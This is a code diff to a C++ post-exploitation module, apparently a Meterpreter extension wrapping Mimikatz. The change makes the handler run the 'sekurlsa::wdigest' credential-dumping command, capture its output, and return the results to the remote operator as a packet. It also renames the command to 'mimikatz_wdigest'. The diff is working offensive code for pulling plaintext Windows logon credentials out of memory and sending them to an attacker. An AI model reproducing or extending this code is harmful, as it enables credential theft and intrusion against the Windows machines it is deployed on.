@@ -33,9 +33,6 @@ DWORD request_boiler(Remote *remote, Packet *packet)
 {
 	Packet * response = packet_create_response(packet);
 	bool iResult;
-	std::wofstream logFile("c:\\out.txt");
-	std::wstreambuf *outbuf = std::wcout.rdbuf(logFile.rdbuf()); 
-	outputStream = &logFile;
 
 	wstring function = (L"sekurlsa::wdigest");
 	vector<wstring> *args = new vector<wstring>();
@@ -46,16 +43,14 @@ DWORD request_boiler(Remote *remote, Packet *packet)
 	iResult = myMimiKatz->doCommandeLocale(&function, args);
 	delete myMimiKatz;
 
-	std::wcout.rdbuf(outbuf);
-
-	//wstring output = (*logFile).str(); 
-	//const wchar_t* outputStr = output.c_str(); 
-	//wchar_t* out = new wchar_t[output.size()+1]; 
-	//wcscpy(out, outputStr); 
-	//out[output.size()] = '\0';
-
 	//http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
-	packet_add_tlv_string(response, TLV_MIMIKATZ_RESULT, "test");
+	wstring output = oss.str(); 
+	const wchar_t* outputStr = output.c_str(); 
+	wchar_t* out = new wchar_t[output.size()+1]; 
+	wcscpy(out, outputStr); 
+	out[output.size()] = '\0';
+	
+	packet_add_tlv_raw(response, TLV_MIMIKATZ_RESULT, out, wcslen(out)*sizeof(wchar_t));
 	packet_transmit_response(iResult, remote, response);
 
 	return ERROR_SUCCESS;	
@@ -63,7 +58,7 @@ DWORD request_boiler(Remote *remote, Packet *packet)
 
 Command customCommands[] =
 {
-	{ "boiler",
+	{ "mimikatz_wdigest",
 	  { request_boiler,                                    { 0 }, 0 },
 	  { EMPTY_DISPATCH_HANDLER                                      },
 	},
